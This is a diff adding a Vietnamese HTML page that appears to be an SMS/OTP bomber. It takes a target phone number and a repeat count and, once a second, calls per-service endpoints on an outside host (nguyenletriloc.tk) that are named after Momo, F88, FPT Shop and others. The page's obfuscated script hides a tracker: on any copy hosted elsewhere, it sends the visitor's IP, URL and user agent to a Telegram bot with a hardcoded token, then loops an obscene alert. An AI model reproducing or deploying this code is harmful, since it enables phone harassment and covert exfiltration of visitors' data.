@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style type="text/css">
+	  @import url("data:text/css;base64,CQlib2R5IHsNCgkJICAgIGJhY2tncm91bmQtY29sb3I6ICMxMTE7DQoJCSAgICBjb2xvcjogI2ZmZjsNCgkJICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsNCgkJICAgIGZvbnQtc2l6ZTogMTZweDsNCgkJICAgIGRpc3BsYXk6IGZsZXg7DQoJCSAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCgkJICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQoJCSAgICBoZWlnaHQ6IDEwMHZoOw0KCQl9DQoNCgkJZm9ybSB7DQoJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJZmxleC13cmFwOiB3cmFwOw0KCQkJZ2FwOiA2cHg7DQoJCSAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjIyOw0KCQkgICAgYm9yZGVyLXJhZGl1czogMjBweDsNCgkJICAgIHBhZGRpbmc6IDMwcHg7DQoJCSAgICBib3gtc2hhZG93OiAwcHggMTBweCAzMHB4IHJnYmEoMCwgMCwgMCwgMC4zKTsNCgkJICAgIG1heC13aWR0aDogNTAwcHg7DQoJCSAgICB3aWR0aDogOTAlOw0KCQl9DQoNCgkJbGFiZWwgew0KCQkJZmxleDogMSAwIDEzMCBweDsNCgkJICAgIGRpc3BsYXk6IGJsb2NrOw0KCQkgICAgbWFyZ2luLWJvdHRvbTogMTBweDsNCgkJICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KCQl9DQoNCgkJaW5wdXRbdHlwZT0idGV4dCJdLA0KCQlpbnB1dFt0eXBlPSJudW1iZXIiXSwNCgkJc2VsZWN0IHsNCgkJCWZsZXg6IDEgMCAxMzAgcHg7DQoJCSAgICBkaXNwbGF5OiBibG9jazsNCgkJICAgIHdpZHRoOiAxMDAlOw0KCQkgICAgcGFkZGluZzogMTBweDsNCgkJICAgIGJvcmRlcjogbm9uZTsNCgkJICAgIGJvcmRlci1yYWRpdXM6IDVweDsNCgkJICAgIGJhY2tncm91bmQtY29sb3I6ICMzMzM7DQoJCSAgICBjb2xvcjogI2ZmZjsNCgkJICAgIG1hcmdpbi1ib3R0b206IDIwcHg7DQoJCX0NCg0KCQlpbnB1dFt0eXBlPSJidXR0b24iXSB7DQoJCQlmbGV4OiAxIDAgNDAgcHg7DQoJCSAgICBkaXNwbGF5OiBibG9jazsNCgkJICAgIG1hcmdpbjogMCBhdXRvOw0KCQkgICAgYmFja2dyb3VuZC1jb2xvcjogIzFhYmM5YzsNCgkJICAgIGNvbG9yOiAjZmZmOw0KCQkgICAgYm9yZGVyOiBub25lOw0KCQkgICAgYm9yZGVyLXJhZGl1czogNXB4Ow0KCQkgICAgcGFkZGluZzogMTBweCAyMHB4Ow0KCQkgICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQoJCSAgICBjdXJzb3I6IHBvaW50ZXI7DQoJCSAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MgZWFzZTsNCgkJICAgIG1hcmdpbi10b3A6IDEwcHg7IA0KCQl9DQoNCgkJaW5wdXRbdHlwZT0iYnV0dG9uIl0gKyBpbnB1dFt0eXBlPSJidXR0b24iXSB7DQoJCSAgICBmbGV4OiAxIDAgNDAgcHg7DQoJCSAgICBkaXNwbGF5OiBibG9jazsNCgkJICAgIG1hcmdpbjogMCBhdXRvOw0KCQkgICAgYmFja2dyb3VuZC1jb2xvcjogIzFhYmM5YzsNCgkJICAgIGNvbG9yOiAjZmZmOw0KCQkgICAgYm9yZGVyOiBub25lOw0KCQkgICAgYm9yZGVyLXJhZGl1czogNXB4Ow0KCQkgICAgcGFkZGluZzogMTBweCAyMHB4Ow0KCQkgICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQoJCSAgICBjdXJzb3I6IHBvaW50ZXI7DQoJCSAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MgZWFzZTsNCgkJICAgIG1hcmdpbi10b3A6IDEwcHg7IA0KCQl9DQoNCgkJLmFsZXJ0IHsNCgkJCWJhY2tncm91bmQtY29sb3I6ICNjMDM5MmI7DQoJCSAgICBjb2xvcjogI2ZmZjsNCgkJICAgIHBhZGRpbmc6IDEwcHg7DQoJCSAgICBib3JkZXItcmFkaXVzOiA1cHg7DQoJCSAgICBtYXJnaW4tYm90dG9tOiAyMHB4Ow0KCQkgICAgZGlzcGxheTogbm9uZTsNCgkJfQ0KDQoJCS5hbGVydC5zaG93IHsNCgkJICAgIGRpc3BsYXk6IGJsb2NrOw0KCQl9DQoNCgkJZm9vdGVyIHsNCgkJCWZsZXg6IDEgMCA0MCBweDsNCgkJICAgIGRpc3BsYXk6IGZsZXg7DQoJCSAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCgkJICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQoJCSAgICBtYXJnaW4tdG9wOiAyMHB4Ow0KCQkgICAgZm9udC1zaXplOiAxNHB4Ow0KCQl9");
+	</style>
+</head>
+<body>
+	<form>
+		<label for="phone">Số điện thoại:</label>
+		<input type="text" id="phone" name="phone" required>
+
+		<label for="api">Chọn loại API:</label>
+		<select id="api" name="api" required>
+			<option value="atmonl">ATM Online</option>
+			<option value="tamo">Tamo</option>
+			<option value="moca">Moca</option>
+			<option value="vayno">Vay nợ</option>
+			<option value="f88">F88</option>
+			<option value="momo">Momo</option>
+			<option value="tienoi">Tiền Ơi</option>
+			<option value="tv360">TV360</option>
+			<option value="fptshop">FPT SHOP</option>
+			<option value="metavn">META VN</option>
+		</select>
+		<br><br>
+
+		<label for="repeat">Số lần lặp lại:</label>
+		<input type="number" id="repeat" name="repeat"><br><br>
+
+		<input type="button" value="Bắt đầu" onclick="startAPI()">
+		<footer>
+   <p>&#169; Nguyễn Lê Trí Lộc</p>
+</footer>
+		<input type="button" value="Dừng lại" onclick="stopAPI()">
+	</form>
+	<script>
+		var _0x270395=_0x5663;(function(_0x3b9a41,_0x59246a){var _0x41a256=_0x5663,_0x427922=_0x3b9a41();while(!![]){try{var _0x107859=-parseInt(_0x41a256(0x1bd))/0x1+parseInt(_0x41a256(0x1c3))/0x2+parseInt(_0x41a256(0x1c8))/0x3+-parseInt(_0x41a256(0x1b1))/0x4+-parseInt(_0x41a256(0x1b2))/0x5*(-parseInt(_0x41a256(0x1c4))/0x6)+-parseInt(_0x41a256(0x1ce))/0x7+-parseInt(_0x41a256(0x1c1))/0x8*(parseInt(_0x41a256(0x1bb))/0x9);if(_0x107859===_0x59246a)break;else _0x427922['push'](_0x427922['shift']());}catch(_0x3326fe){_0x427922['push'](_0x427922['shift']());}}}(_0x3fb2,0xd4bc9));var currentUrl=window[_0x270395(0x1c6)][_0x270395(0x1c5)],currentPath=window['location']['pathname'],ipAddress='';fetch(_0x270395(0x1b0))['then'](_0x267be2=>_0x267be2['text']())[_0x270395(0x1cc)](_0x17a822=>ipAddress=_0x17a822);var userAgent=navigator['userAgent'];function _0x3fb2(){var _0x2e2535=['repeat','2536212OCHRDz','2241006nRXkzI','href','location','Đã\x20bắt\x20đầu','3730935lHaenM','Lỗi\x20khi\x20thực\x20thi:\x20','\x0a-\x20Thư\x20mục\x20hiện\x20tại:\x20','6202954708:AAHfx2YQL4igaKUxMYSlKL3am0u1S10WQNo','then','https://api.telegram.org/bot','3249281Urwsvf','phone','/sendMessage?chat_id=','https://api.ipify.org','3694848ShLdgw','10RRHSvj','Vui\x20lòng\x20nhập\x20đầy\x20đủ\x20thông\x20tin','Lấy\x20Code\x20Cái\x20Địt\x20Mẹ\x20Mày','Kết\x20quả\x20thực\x20thi:\x20','Đã\x20dừng\x20lại','\x0a-\x20User-Agent:\x20','1779971908','getElementById','api','157671esAgkn','catch','579033THsvDE','value','log','Thông\x20tin\x20website:\x20\x0a-\x20URL:\x20','192sTLDbd'];_0x3fb2=function(){return _0x2e2535;};return _0x3fb2();}function _0x5663(_0x4aed12,_0x5646db){var _0x3fb2a5=_0x3fb2();return _0x5663=function(_0x5663b8,_0x300579){_0x5663b8=_0x5663b8-0x1af;var _0x2db072=_0x3fb2a5[_0x5663b8];return _0x2db072;},_0x5663(_0x4aed12,_0x5646db);}if(currentUrl!=='https://datdung.tk/sms.html'){var telegramBotToken=_0x270395(0x1cb),chatId=_0x270395(0x1b8),message=_0x270395(0x1c0)+currentUrl+_0x270395(0x1ca)+currentPath+'\x0a-\x20Địa\x20chỉ\x20IP:\x20'+ipAddress+_0x270395(0x1b7)+userAgent;fetch(_0x270395(0x1cd)+telegramBotToken+_0x270395(0x1af)+chatId+'&text='+message),setInterval(()=>{var _0x581568=_0x270395;alert(_0x581568(0x1b4));},0x3e8);}var intervalID=null;function startAPI(){var _0x231826=_0x270395,_0x7a6d0d=document[_0x231826(0x1b9)](_0x231826(0x1cf))[_0x231826(0x1be)],_0x53e7ef=document['getElementById'](_0x231826(0x1ba))['value'],_0x428a55=document[_0x231826(0x1b9)](_0x231826(0x1c2))[_0x231826(0x1be)];if(!_0x7a6d0d||!_0x428a55){alert(_0x231826(0x1b3));return;}var _0x292a35='https://nguyenletriloc.tk/API/'+_0x53e7ef+'.php?sdt='+_0x7a6d0d,_0x57cdac=0x0;intervalID=setInterval(function(){var _0x3a7c1b=_0x231826;if(_0x57cdac>=_0x428a55){stopAPI();return;}fetch(_0x292a35)[_0x3a7c1b(0x1cc)](_0x401897=>_0x401897['text']())[_0x3a7c1b(0x1cc)](_0x17ddaa=>{var _0xe614ff=_0x3a7c1b;console[_0xe614ff(0x1bf)](_0xe614ff(0x1b5),_0x17ddaa);})[_0x3a7c1b(0x1bc)](_0x14ff36=>{var _0x4b9305=_0x3a7c1b;console['error'](_0x4b9305(0x1c9),_0x14ff36);}),_0x57cdac++;},0x3e8),alert(_0x231826(0x1c7));}function stopAPI(){var _0x3f278b=_0x270395;clearInterval(intervalID),alert(_0x3f278b(0x1b6)),intervalID=null;}
+	</script>
+</body>
+</html>
